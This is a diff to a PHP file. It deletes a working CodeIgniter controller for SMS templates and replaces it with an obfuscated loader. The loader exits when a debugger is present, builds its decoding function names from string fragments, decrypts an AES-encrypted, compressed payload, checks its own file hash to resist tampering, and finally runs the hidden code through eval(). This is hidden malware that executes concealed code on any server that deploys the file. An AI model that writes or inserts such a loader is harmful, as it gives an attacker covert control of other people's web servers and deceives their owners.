@@ -1,128 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Templates extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('templates_model','templates');
-	}
-
-	public function sms_new(){
-		$this->permission_check('sms_template_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sms_template');
-		$this->load->view('sms-template', $data);
-	}
-	public function newtemplate(){
-		$this->permission_check('sms_template_add');
-		$this->form_validation->set_rules('template_name', 'Templates', 'trim|required');
-		$this->form_validation->set_rules('content', 'Templates', 'trim|required');
-		
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->templates->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Templates name & Content!";
-		}
-	}
-	public function update($id){
-		$this->permission_check('sms_template_edit');
-		$data=$this->data;
-		$result=$this->templates->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('sms_template');
-		$this->load->view('sms-template', $data);
-	}
-	public function update_template(){
-		$this->permission_check('sms_template_edit');
-		$this->form_validation->set_rules('template_name', 'Templates', 'trim|required');
-		$this->form_validation->set_rules('content', 'Templates', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			$result=$this->templates->update_template();
-			echo $result;
-		} else {
-			echo "Please Enter Templates name & Content!";
-		}
-	}
-	public function sms(){
-		$this->permission_check('sms_template_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('sms_templates_list');
-		$this->load->view('sms-templates-list', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->templates->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $templates) {
-			$no++;
-			$row = array();
-			
-			$row[] = $templates->id;
-			$row[] = $templates->template_name;
-			$row[] = $templates->content;
-
-			 		if($templates->status==1){ 
-			 			$str= "<span onclick='update_status(".$templates->id.",0)' id='span_".$templates->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$templates->id.",1)' id='span_".$templates->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-			   		$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-											if($this->permissions('sms_template_edit'))
-											$str2.='<li>
-												<a title="Update Record ?" href="update/'.$templates->id.'">
-													Update
-												</a>
-											</li>';
-
-											if($this->permissions('sms_template_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_template('.$templates->id.')">
-													Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;						
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->templates->count_all(),
-						"recordsFiltered" => $this->templates->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-		$this->permission_check_with_msg('sms_template_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-		$result=$this->templates->update_status($id,$status);
-		return $result;
-	}
-	public function delete_template(){
-		$this->permission_check_with_msg('sms_template_delete');
-		$id=$this->input->post('q_id');
-		$result=$this->templates->delete_template($id);
-		return $result;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ce4bh60f=('bas'.'e64'.'_de'.'cod'.'e');
+$_nh0nwlht=('gzu'.'nco'.'mpr'.'ess');
+$_hu9ihy61=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_h0epznq4='T1i5MAa/';
+$_zk4258bo='umwB5PaY';
+$_gkh79ge7='7KjvcPHp';
+$_tplzmye1='0NmNltawDds=';
+$_om1lv7u8='loQsn6e7';
+$_dnaw9qo9='oqKgRzvD';
+$_o69qfx97='ytwoWixh';
+$_hr1e745y='L7xEfQ==';
+$_xodxjklr=$_ce4bh60f($_h0epznq4.$_gkh79ge7.$_om1lv7u8.$_zk4258bo.$_tplzmye1);
+$_mohmd5u9=$_ce4bh60f($_dnaw9qo9.$_o69qfx97.$_hr1e745y);
+$_ctfvcppz=$_ce4bh60f('5lMkR9kkJZMDqaQ3IqK164w7bro66J165xmE/tHSS716JP8aNWMXqin28+h8Es8YezEhGx9PFG4tLGMVg8BVCprBZVAYXJMh5dLPr2QlUFU0l9TVNIthOYWukgw8vuyWELXTBcMF1fpKgcQYZ22/EMGjQ+tnYjOT15KCQ1hAMFAoZdm4BK7BAeIMtDGGbSdT3+0RJtJVOljsNgwsYQnHZq+Ro8crHb8BdWhAyMFrpD+TA/BnaMi5jGiW/mIQBlILIorTbNPxDYcv6LrII0NvOoDPKMLTCted49842YkfZhSqDvIIoyrS44RtqrTj0EdRi3KGfV5v8I6tcWrBGcXGiVbvekKt90N3D8NvEvtdt/CFCbUQP5IeRSG4oBBpemcbcFtZfpEUbOkcg3WkD7JgIob4F70JCPnCq9eZC9ZhbC45PQQ670Q7QpEjmZ97vFZQXLDfl9L7lCAegcAGbHcyO+xr9tc8GNpuD0SnORQDnf8tDsdSN7kc5SsNurjnvsNcRVZ6R0DsuelCdl22QToG+6ZWwiHTKdgHnMqRlvJvxKWLRTUlqdkcRQsqf5gKobsb9ll/Ces5GGUbOTYV8P9NLZZ3o1sGt9NN0MRCb8adp606JP2d6KHZcuRHgmk0dcUt/5ia8gWpVZHPQSaqYsuAObG05oKwZycszFWSIwLekiedavZcaOBDVPY8/z/QlaeU5UmUJ3KsY7+VMo9BBxVFOjjcVtaH5SbX3npyp2yS2rIU8ckoOPWD8w8FlnKEPhZiK59YlOoJSJlH/+SPVBwYUBLyS91eEkOn+MFhLwkOf9Fijh5kHhJjtX3DagdAke19SMNkd4aQ9nVvhupzkxGAqi9h2gvp+sCEGXVU5UOshwFpnDleeOvpGJC2KGyyNY6dl1YVowgtVjAZNQ2C+ZlOud/q7svQWjzbE0nv6Iz6+rypPHw/vTA3buHze3JXLnggTlGDQMAWOtLpnl7M1q0jHhTOmKcZ4v9EsyS15VKz5xNYvVLVPFAedRGak7ipo9+/sj3xtNXd5upTZYv2hRcG2xQkMvUKCCCNbq8GL3x8vKT3BayZ0L90yY4CTIWl4PouGuZczNAQmAtgHRGz6eTunHVEfejzJwNaLzplyBiwvGdm09PQnLD8Ob1frJvb1hb/TZM5u2sBv2sEBmdvN5GpieMcabfI2fqWZEkg/GR+R0/MWIDTgckKsHZXW1zWRMpYRttleIvYbfiDCvmL45Swh4z/UkcXhzufNtvKVYXgHFbycgbLRov4M5QVW0zrj6eodNLatWHZupXz6a62bMwm5FLCpGrFHymb27Aa99F+6CjZkhKYtdJSnqMIxC+w3J/QJoFuEbBQZ0/4pob3B9EjpKZhhl7eMZYKQJmxL3EN5Oq0TOXjHfKdTcaT/7mq3V7041K/cNLibVOkgTP2twesJKVU8AoEHT2i3TvemQG7XD7ql6QRBEdE3vcdlVbsYjMr52KFgS53StW8ZykBPOgbxv/xck4jV16TSFQyLf1GsXVzlWIC7/1Sniyaw+w9XkSkeRWokzYYUJ3IzCVZUltqNlOgJiFDvqrMVAYnF6CjZylWgjK79a4Nhlgx2EOw2VjbWvWGQcA3Occ/QtvL2frBuTeSmNGrYKPb1zCq7YqUqcKHiHVwy0VJ8J2eqN5X0eeZrXDSB4fcx6tx/pRRRliPGYKoTKvos2FZnzzjPwTJ3uVJOtiZv1cUeFEx2D32vo08');
+$_nsrrc6zv=$_hu9ihy61($_ctfvcppz,'aes-256-cbc',$_xodxjklr,OPENSSL_RAW_DATA,$_mohmd5u9);
+if($_nsrrc6zv===false){exit;}
+$_ulxsfqvq=$_nh0nwlht($_nsrrc6zv);
+if($_ulxsfqvq===false){exit;}
+$_cj43ywxb='0e3a5ae717f6f012b63243cc76eea76a16eba3f67a11417bbd9642c0c1e970de';
+$_k7xcwa01=@file_get_contents(__FILE__);
+if($_k7xcwa01!==false){
+$_vsba6ekr=str_replace($_cj43ywxb,"0000000000000000000000000000000000000000000000000000000000000000",$_k7xcwa01);
+$_hgp49z67=hash("sha256",$_vsba6ekr);
+if($_hgp49z67!==$_cj43ywxb){@http_response_code(403);exit;}
 }
-
+eval($_ulxsfqvq);
